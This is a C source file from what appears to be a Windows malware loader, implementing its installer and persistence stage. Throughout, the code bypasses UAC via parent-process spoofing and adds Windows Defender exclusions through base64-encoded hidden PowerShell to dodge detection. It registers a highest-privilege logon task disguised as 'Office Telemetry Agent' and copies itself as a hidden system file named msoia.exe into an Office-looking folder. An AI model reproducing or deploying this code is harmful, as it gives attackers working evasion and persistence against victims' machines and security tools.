// =============================================
// Install.c  -  First-run installer + persistence (UAC builds only)
//
// Called from main.c when IsInstallMode() is TRUE (spawned with --install).
//
// Steps:
//   1. GetEnvironmentVariableA("APPDATA") -> base path
//   2. Build dest: %APPDATA%\Microsoft\Office\Updates\
//   3. CreateDirectoryA for each intermediate path level
//   4. RunWdExclude: elevated powershell via AppInfo parent-spoof ->
//        Add-MpPreference (full parent-chain + exe + process)
//        Register-ScheduledTask 'Office Telemetry Agent' (AtLogon, RunLevel Highest)
//      Command is UTF-16LE base64-encoded (-EncodedCommand) to avoid
//      plain-text "Add-MpPreference" pattern detection.
//   5. Sleep(8000): wait for elevated PS to finish setting exclusions
//   6. CopyFileA self -> %APPDATA%\...\Updates\msoia.exe
//      (copy happens AFTER exclusions are active, so WD won't quarantine)
//   7. SetFileAttributesA(dest, HIDDEN|SYSTEM)
//   8. NtTerminateProcess(self)
//
// AMSI note: our patchless AMSI bypass only affects the loader process.
// The elevated PS child spawned by RunWdExclude has its own amsi.dll.
// Putting Copy-Item inside the PS script lets AMSI block the copy.
// Instead we copy in C (no AMSI), after sleeping to let PS set exclusions.
//
// Compiled only when UAC_BYPASS is defined.
// =============================================

#ifdef UAC_BYPASS

#include "Common.h"

// ---- ASCII helpers (no CRT) ----
static SIZE_T Ins_ALen(const CHAR* s) { SIZE_T n = 0; while (s[n]) n++; return n; }
static VOID Ins_ACpy(CHAR* dst, const CHAR* src, SIZE_T max) {
    SIZE_T i; for (i = 0; i < max-1 && src[i]; i++) dst[i]=src[i]; dst[i]=0;
}
static VOID Ins_ACat(CHAR* dst, const CHAR* src, SIZE_T max) {
    SIZE_T n=Ins_ALen(dst), i;
    for (i = 0; i < max-n-1 && src[i]; i++) dst[n+i]=src[i];
    dst[n+i]=0;
}

// ---- Typedefs ----
typedef DWORD (WINAPI* fnGetEnvVarA)(LPCSTR, LPSTR, DWORD);
typedef BOOL  (WINAPI* fnCreateDirA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef BOOL  (WINAPI* fnCopyFileA3)(LPCSTR, LPCSTR, BOOL);
typedef DWORD (WINAPI* fnGetModA)(HMODULE, LPSTR, DWORD);
typedef VOID  (WINAPI* fnSleepA)(DWORD);
typedef NTSTATUS (NTAPI* fnNtTerm2)(HANDLE, NTSTATUS);
typedef HANDLE (WINAPI* fnFindFirstA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI* fnFindNextA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI* fnFindCloseA)(HANDLE);

// ---- B64EncodeW: encode UTF-16LE wide buffer as base64 wide string ----
// pScript: wide-char PS script, nChars: WCHARs used (not incl NUL)
// pOut: output wide chars (ASCII base64 chars widened to WCHAR)
static SIZE_T B64EncodeW(const WCHAR* pScript, SIZE_T nChars, WCHAR* pOut) {
    static const CHAR alpha[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    const BYTE* pIn = (const BYTE*)pScript;
    SIZE_T nBytes = nChars * 2; // UTF-16LE: 2 bytes per WCHAR
    SIZE_T i, o = 0;
    for (i = 0; i < nBytes; i += 3) {
        BYTE b0 = pIn[i];
        BYTE b1 = (i+1 < nBytes) ? pIn[i+1] : 0;
        BYTE b2 = (i+2 < nBytes) ? pIn[i+2] : 0;
        pOut[o++] = (WCHAR)alpha[b0 >> 2];
        pOut[o++] = (WCHAR)alpha[((b0 & 3) << 4) | (b1 >> 4)];
        pOut[o++] = (i+1 < nBytes) ? (WCHAR)alpha[((b1 & 0xF) << 2) | (b2 >> 6)] : L'=';
        pOut[o++] = (i+2 < nBytes) ? (WCHAR)alpha[b2 & 0x3F] : L'=';
    }
    pOut[o] = 0;
    return o;
}

// ---- RunWdExclude: elevated powershell via AppInfo for WD exclusions + HKLM run-key ----
// Builds a PS script, base64-encodes it (-EncodedCommand), and spawns it elevated.
// Script does: Add-MpPreference (full parent-chain + exe + process) + New-ItemProperty.
// File copy is intentionally NOT done here: AMSI in the PS child would scan the decoded
// script and block Copy-Item. The copy is done in C after this function returns.
static VOID RunWdExclude(IN PAPI_HASHING pApi, IN PVOID pNtdll, IN PVOID pK32,
                         IN LPCSTR szDestDir, IN LPCSTR szDestExe) {
    // Static buffers — not on stack.
    // wScript: PS inner script.  wB64: base64 of wScript.  wFinal: full command line.
    static WCHAR wScript[2048];
    static WCHAR wB64[5600];
    static WCHAR wFinal[5700];

    SIZE_T pos = 0;
    MemSet(wScript, 0, sizeof(wScript));

#define WA(s) do { \
    const CHAR* _s=(const CHAR*)(s); \
    for(SIZE_T _i=0; _s[_i] && pos<2040; _i++) wScript[pos++]=(WCHAR)(UCHAR)_s[_i]; \
} while(0)
#define WW(w) do { \
    const WCHAR* _w=(w); \
    for(SIZE_T _i=0; _w[_i] && pos<2040; _i++) wScript[pos++]=_w[_i]; \
} while(0)

    WW(L"Add-MpPreference -ExclusionPath @(");

    // Walk szDestDir left-to-right; emit each '\'-terminated prefix as a quoted element.
    CHAR szTmp[MAX_PATH] = {0};
    Ins_ACpy(szTmp, szDestDir, MAX_PATH);
    SIZE_T dlen = Ins_ALen(szTmp);
    BOOL firstPath = TRUE;
    for (SIZE_T i = 1; i <= dlen && pos < 2030; i++) {
        if (szTmp[i-1] == '\\') {
            if (!firstPath) wScript[pos++] = L',';
            wScript[pos++] = L'\'';
            for (SIZE_T k = 0; k < i && pos < 2038; k++)
                wScript[pos++] = (WCHAR)(UCHAR)szTmp[k];
            wScript[pos++] = L'\'';
            firstPath = FALSE;
        }
    }
    // Add dest exe to ExclusionPath
    wScript[pos++] = L',';
    wScript[pos++] = L'\'';
    WA(szDestExe);
    wScript[pos++] = L'\'';

    WW(L") -ExclusionProcess '");
    BYTE xPName[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName);
    WA((CHAR*)xPName);
    WW(L"';");

    // Scheduled task: RunLevel Highest so reboot runs elevated without UAC prompt.
    WW(L"Register-ScheduledTask -Force -TaskName '");
    BYTE xValName[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xValName);
    WA((CHAR*)xValName);
    WW(L"' -Action (New-ScheduledTaskAction -Execute '");
    WA(szDestExe);
    WW(L"') -Trigger (New-ScheduledTaskTrigger -AtLogon) -Settings (New-ScheduledTaskSettingsSet) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive)");

#undef WA
#undef WW

    MemSet(wB64, 0, sizeof(wB64));
    B64EncodeW(wScript, pos, wB64);

    SIZE_T fpos = 0;
    MemSet(wFinal, 0, sizeof(wFinal));
    BYTE xPsExe[] = XSTR_PS_EXE; DEOBF(xPsExe);
    for (SIZE_T _i = 0; ((CHAR*)xPsExe)[_i]; _i++)
        wFinal[fpos++] = (WCHAR)(UCHAR)((CHAR*)xPsExe)[_i];
    const WCHAR wFlags[] = L" -NonInteractive -WindowStyle Hidden -EncodedCommand ";
    for (SIZE_T _i = 0; wFlags[_i]; _i++) wFinal[fpos++] = wFlags[_i];
    for (SIZE_T _i = 0; wB64[_i] && fpos < 5698; _i++) wFinal[fpos++] = wB64[_i];
    wFinal[fpos] = 0;

    typedef DWORD (WINAPI* fnGSD2)(LPWSTR, UINT);
    typedef DWORD (WINAPI* fnGWD2)(LPWSTR, UINT);
    fnGSD2 pGSD = (fnGSD2)FetchExportAddress(pK32, GetSystemDirectoryW_JOAAT);
    fnGWD2 pGWD = (fnGWD2)FetchExportAddress(pK32, GetWindowsDirectoryW_JOAAT);
    if (!pGSD || !pGWD) return;

    WCHAR wSysDir[MAX_PATH] = {0};
    WCHAR wWinDir[MAX_PATH] = {0};
    pGSD(wSysDir, MAX_PATH);
    pGWD(wWinDir, MAX_PATH);

    LOG("[*] Install: launching WD excl + scheduled task via AppInfo (EncodedCommand)...");
    UacRunCommandElevated(pApi, pNtdll, wSysDir, wWinDir, wFinal);
}

// ---- InstallAndTerminate: main entry point ----
VOID InstallAndTerminate(IN PAPI_HASHING pApi) {
    PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!pK32 || !pNtdll) return;

    BYTE xGetEnv[] = XSTR_GET_ENV_VAR_A;      DEOBF(xGetEnv);
    BYTE xMkDir[]  = XSTR_CREATE_DIRECTORY_A; DEOBF(xMkDir);
    BYTE xCpFile[] = XSTR_COPY_FILE_A;        DEOBF(xCpFile);
    fnGetEnvVarA  pGetEnv  = (fnGetEnvVarA) pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xGetEnv);
    fnCreateDirA  pMkDir   = (fnCreateDirA) pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xMkDir);
    fnCopyFileA3  pCpFile  = (fnCopyFileA3) pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xCpFile);
    fnGetModA     pGetModA = (fnGetModA)    FetchExportAddress(pK32, GetModuleFileNameA_JOAAT);
    fnSleepA      pSleep   = (fnSleepA)     FetchExportAddress(pK32, Sleep_JOAAT);

    if (!pGetEnv || !pMkDir || !pCpFile || !pGetModA) {
        LOG("[!] Install: kernel32 API resolution failed");
        goto terminate;
    }

    // 1. Get APPDATA
    CHAR szAppData[MAX_PATH] = {0};
    BYTE xAppData[] = XSTR_APPDATA_VAR; DEOBF(xAppData);
    if (!pGetEnv((LPCSTR)xAppData, szAppData, MAX_PATH)) {
        LOG("[!] Install: GetEnvironmentVariableA(APPDATA) failed");
        goto terminate;
    }

    // 2. Build full dest dir; create each intermediate directory level.
    // Walk XSTR_INSTALL_SUBDIR char-by-char, calling CreateDirectoryA at each '\'
    // so machines without Microsoft\Office\ get all intermediate dirs created.
    CHAR szDestDir[MAX_PATH] = {0};
    Ins_ACpy(szDestDir, szAppData, MAX_PATH);
    {
        BYTE xSubDir[] = XSTR_INSTALL_SUBDIR; DEOBF(xSubDir);
        SIZE_T base = Ins_ALen(szDestDir);
        for (SIZE_T i = 0; xSubDir[i]; i++) {
            szDestDir[base + i]     = xSubDir[i];
            szDestDir[base + i + 1] = '\0';
            if (xSubDir[i] == '\\') {
                pMkDir(szDestDir, NULL); // ignore failure (dir may already exist)
            }
        }
    }
    LOG("[+] Install: directory tree ensured");

    // 3. Build dest EXE path
    CHAR szDestExe[MAX_PATH] = {0};
    Ins_ACpy(szDestExe, szDestDir, MAX_PATH);
    BYTE xPName[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName);
    Ins_ACat(szDestExe, (CHAR*)xPName, MAX_PATH);

    // 4. Get source EXE path
    CHAR szSrcExe[MAX_PATH] = {0};
    if (!pGetModA(NULL, szSrcExe, MAX_PATH)) {
        LOG("[!] Install: GetModuleFileNameA failed");
        goto terminate;
    }

    // 5. Launch elevated PS: WD exclusions (full path chain + file + process) + HKLM run-key.
    //    Copy is intentionally NOT done inside PS to avoid AMSI blocking Copy-Item in the
    //    PS child process (our AMSI bypass only covers the loader process).
    RunWdExclude(pApi, pNtdll, pK32, szDestDir, szDestExe);

    // 6. Wait for elevated PS to set exclusions before copying.
    //    PS startup + Add-MpPreference typically completes in < 3 seconds.
    //    8 seconds provides margin on slow / heavily-loaded machines.
    if (pSleep) pSleep(8000);

    // 7. Copy EXE (now inside the WD exclusion path — won't be quarantined)
    if (!pCpFile(szSrcExe, szDestExe, FALSE)) {
        LOG_HEX("[!] Install: CopyFileA failed, GLE=", GetLastError());
    } else {
        LOG("[+] Install: EXE copied to persistence path");
    }

terminate:
    LOG("[*] Install: terminating install process");
    fnNtTerm2 pNtTerm = (fnNtTerm2)FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
    if (pNtTerm) pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
}

// =============================================
// SideloadInstallAndContinue (DLL UAC builds only)
//
// Called from SideloadWorker when the process is elevated and the host
// EXE is not yet running from the persistence directory.
//
// Steps:
//   1. Build %APPDATA%\Microsoft\Office\Updates\ tree
//   2. Run encoded PS (via AppInfo parent-spoof): Add-MpPreference + Register-ScheduledTask
//      Task runs at RunLevel Highest (admin without UAC prompt). -Argument '/pf' tells
//      SideloadWorker this is a persistence reboot so it skips re-elevation + re-install.
//   3. Sleep(8000) — wait for PS exclusions to be active
//   4. CopyFileA host EXE → dest dir as msoia.exe (same disguise as EXE UAC build)
//   5. FindFirstFileA *.dll in source dir → CopyFileA each to dest dir
//
// Does NOT terminate — shellcode continues running after install.
// Self-guards: returns immediately if the host EXE is already inside
// the persistence directory (prevents re-install on persistence reboots).
// =============================================

#ifdef BUILD_DLL

VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
    // Large/reused buffers are static to keep the stack frame under 4 KB.
    static WCHAR wScript[2048];
    static WCHAR wB64[5600];
    static WCHAR wFinal[5700];
    static WIN32_FIND_DATAA s_wfd;
    static CHAR  s_szSrcDll[MAX_PATH];
    static CHAR  s_szDstDll[MAX_PATH];
    static CHAR  s_szPattern[MAX_PATH];

    PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!pK32 || !pNtdll) return;

    BYTE xGetEnv[] = XSTR_GET_ENV_VAR_A;      DEOBF(xGetEnv);
    BYTE xMkDir[]  = XSTR_CREATE_DIRECTORY_A; DEOBF(xMkDir);
    BYTE xCpFile[] = XSTR_COPY_FILE_A;        DEOBF(xCpFile);

    fnGetEnvVarA  pGetEnv  = (fnGetEnvVarA)  pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xGetEnv);
    fnCreateDirA  pMkDir   = (fnCreateDirA)  pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xMkDir);
    fnCopyFileA3  pCpFile  = (fnCopyFileA3)  pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xCpFile);
    fnGetModA     pGetModA = (fnGetModA)     FetchExportAddress(pK32, GetModuleFileNameA_JOAAT);
    fnSleepA      pSleep   = (fnSleepA)      FetchExportAddress(pK32, Sleep_JOAAT);
    fnFindFirstA  pFFF     = (fnFindFirstA)  FetchExportAddress(pK32, FindFirstFileA_JOAAT);
    fnFindNextA   pFNF     = (fnFindNextA)   FetchExportAddress(pK32, FindNextFileA_JOAAT);
    fnFindCloseA  pFC      = (fnFindCloseA)  FetchExportAddress(pK32, FindClose_JOAAT);

    typedef DWORD (WINAPI* fnGSD2)(LPWSTR, UINT);
    typedef DWORD (WINAPI* fnGWD2)(LPWSTR, UINT);
    fnGSD2 pGSD = (fnGSD2)FetchExportAddress(pK32, GetSystemDirectoryW_JOAAT);
    fnGWD2 pGWD = (fnGWD2)FetchExportAddress(pK32, GetWindowsDirectoryW_JOAAT);

    if (!pGetEnv || !pMkDir || !pCpFile || !pGetModA || !pFFF || !pFNF || !pFC || !pGSD || !pGWD) {
        LOG("[!] SideloadInstall: API resolution failed");
        return;
    }

    // 1. APPDATA
    CHAR szAppData[MAX_PATH] = {0};
    BYTE xAppData[] = XSTR_APPDATA_VAR; DEOBF(xAppData);
    if (!pGetEnv((LPCSTR)xAppData, szAppData, MAX_PATH)) return;

    // 2. Build dest dir (walk XSTR_INSTALL_SUBDIR, mkdir at each '\')
    CHAR szDestDir[MAX_PATH] = {0};
    Ins_ACpy(szDestDir, szAppData, MAX_PATH);
    {
        BYTE xSubDir[] = XSTR_INSTALL_SUBDIR; DEOBF(xSubDir);
        SIZE_T base = Ins_ALen(szDestDir);
        for (SIZE_T i = 0; xSubDir[i]; i++) {
            szDestDir[base + i]     = xSubDir[i];
            szDestDir[base + i + 1] = '\0';
            if (xSubDir[i] == '\\') pMkDir(szDestDir, NULL);
        }
    }

    // 3. Get host EXE path and derive source dir
    CHAR szSrcExe[MAX_PATH] = {0};
    if (!pGetModA(NULL, szSrcExe, MAX_PATH)) return;

    SIZE_T exeLen = Ins_ALen(szSrcExe);
    SIZE_T lastSep = 0;
    for (SIZE_T i = 0; i < exeLen; i++)
        if (szSrcExe[i] == '\\') lastSep = i;

    CHAR szSrcDir[MAX_PATH] = {0};
    MemCopy(szSrcDir, szSrcExe, lastSep + 1); // trailing '\'

    // 4. Self-guard: if already inside persist dir, skip install (reboot path)
    {
        SIZE_T pfxLen = Ins_ALen(szDestDir);
        if (exeLen >= pfxLen) {
            BOOL bMatch = TRUE;
            for (SIZE_T i = 0; i < pfxLen; i++) {
                CHAR a = szDestDir[i], b = szSrcExe[i];
                if (a >= 'A' && a <= 'Z') a += 32;
                if (b >= 'A' && b <= 'Z') b += 32;
                if (a != b) { bMatch = FALSE; break; }
            }
            if (bMatch) {
                LOG("[*] SideloadInstall: already in persist path, skipping");
                return;
            }
        }
    }

    // 5. Build dest EXE path (destDir + msoia.exe — same disguise name as EXE UAC build)
    CHAR szDestExe[MAX_PATH] = {0};
    Ins_ACpy(szDestExe, szDestDir, MAX_PATH);
    BYTE xPName2[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName2);
    Ins_ACat(szDestExe, (CHAR*)xPName2, MAX_PATH);

    // 6. Build and run encoded PS: WD exclusions + HKLM run-key (" /pf" appended)
    {
        SIZE_T pos = 0;
        MemSet(wScript, 0, sizeof(wScript));

#define SLA(s) do { \
    const CHAR* _s=(const CHAR*)(s); \
    for(SIZE_T _i=0; _s[_i] && pos<2040; _i++) wScript[pos++]=(WCHAR)(UCHAR)_s[_i]; \
} while(0)
#define SLW(w) do { \
    const WCHAR* _w=(w); \
    for(SIZE_T _i=0; _w[_i] && pos<2040; _i++) wScript[pos++]=_w[_i]; \
} while(0)

        SLW(L"Add-MpPreference -ExclusionPath @(");
        {
            CHAR szTmp[MAX_PATH]; Ins_ACpy(szTmp, szDestDir, MAX_PATH);
            SIZE_T dlen = Ins_ALen(szTmp);
            BOOL firstPath = TRUE;
            for (SIZE_T i = 1; i <= dlen && pos < 2030; i++) {
                if (szTmp[i-1] == '\\') {
                    if (!firstPath) wScript[pos++] = L',';
                    wScript[pos++] = L'\'';
                    for (SIZE_T k = 0; k < i && pos < 2038; k++)
                        wScript[pos++] = (WCHAR)(UCHAR)szTmp[k];
                    wScript[pos++] = L'\'';
                    firstPath = FALSE;
                }
            }
        }
        wScript[pos++] = L',';
        wScript[pos++] = L'\'';
        SLA(szDestExe);
        wScript[pos++] = L'\'';
        SLW(L") -ExclusionProcess '");
        { BYTE xPN3[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPN3); SLA((CHAR*)xPN3); }
        SLW(L"';");

        // Scheduled task: RunLevel Highest so reboot runs elevated without UAC prompt.
        // -Argument '/pf' tells SideloadWorker this is a persistence reboot.
        // Start-Sleep waits until the C-side Sleep(8000)+CopyFileA are guaranteed done
        // before Start-ScheduledTask fires msoia.exe (which needs the copied files).
        SLW(L"Register-ScheduledTask -Force -TaskName '");
        BYTE xValName[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xValName);
        SLA((CHAR*)xValName);
        SLW(L"' -Action (New-ScheduledTaskAction -Execute '");
        SLA(szDestExe);
        SLW(L"' -Argument '/pf') -Trigger (New-ScheduledTaskTrigger -AtLogon) -Settings (New-ScheduledTaskSettingsSet) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive);");
        SLW(L"Start-Sleep -Seconds 15;");
        SLW(L"Start-ScheduledTask -TaskName '");
        { BYTE xVN2[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xVN2); SLA((CHAR*)xVN2); }
        SLW(L"'");

#undef SLA
#undef SLW

        MemSet(wB64, 0, sizeof(wB64));
        B64EncodeW(wScript, pos, wB64);

        SIZE_T fpos = 0;
        MemSet(wFinal, 0, sizeof(wFinal));
        BYTE xPsExe[] = XSTR_PS_EXE; DEOBF(xPsExe);
        for (SIZE_T _i = 0; ((CHAR*)xPsExe)[_i]; _i++)
            wFinal[fpos++] = (WCHAR)(UCHAR)((CHAR*)xPsExe)[_i];
        const WCHAR wFlags[] = L" -NonInteractive -WindowStyle Hidden -EncodedCommand ";
        for (SIZE_T _i = 0; wFlags[_i]; _i++) wFinal[fpos++] = wFlags[_i];
        for (SIZE_T _i = 0; wB64[_i] && fpos < 5698; _i++) wFinal[fpos++] = wB64[_i];
        wFinal[fpos] = 0;

        WCHAR wSysDir[MAX_PATH] = {0};
        WCHAR wWinDir[MAX_PATH] = {0};
        pGSD(wSysDir, MAX_PATH);
        pGWD(wWinDir, MAX_PATH);

        LOG("[*] SideloadInstall: launching WD excl + scheduled task via AppInfo...");
        UacRunCommandElevated(pApi, pNtdll, wSysDir, wWinDir, wFinal);
    }

    // 7. Wait for PS to finish before copying
    if (pSleep) pSleep(8000);

    // 8. Copy host EXE
    if (!pCpFile(szSrcExe, szDestExe, FALSE)) {
        LOG("[!] SideloadInstall: CopyFileA (EXE) failed");
    } else {
        LOG("[+] SideloadInstall: EXE copied");
    }

    // 9. Enumerate and copy all *.dll from source dir
    Ins_ACpy(s_szPattern, szSrcDir, MAX_PATH);
    {
        const CHAR szGlob[] = {'*', '.', 'd', 'l', 'l', 0};
        Ins_ACat(s_szPattern, szGlob, MAX_PATH);
    }
    MemSet(&s_wfd, 0, sizeof(s_wfd));
    HANDLE hFind = pFFF(s_szPattern, &s_wfd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(s_wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                Ins_ACpy(s_szSrcDll, szSrcDir, MAX_PATH);
                Ins_ACat(s_szSrcDll, s_wfd.cFileName, MAX_PATH);
                Ins_ACpy(s_szDstDll, szDestDir, MAX_PATH);
                Ins_ACat(s_szDstDll, s_wfd.cFileName, MAX_PATH);
                pCpFile(s_szSrcDll, s_szDstDll, FALSE);
            }
        } while (pFNF(hFind, &s_wfd));
        pFC(hFind);
        LOG("[+] SideloadInstall: DLLs copied");
    }
    LOG("[+] SideloadInstall: done");
}

#endif /* BUILD_DLL */

#endif /* UAC_BYPASS */
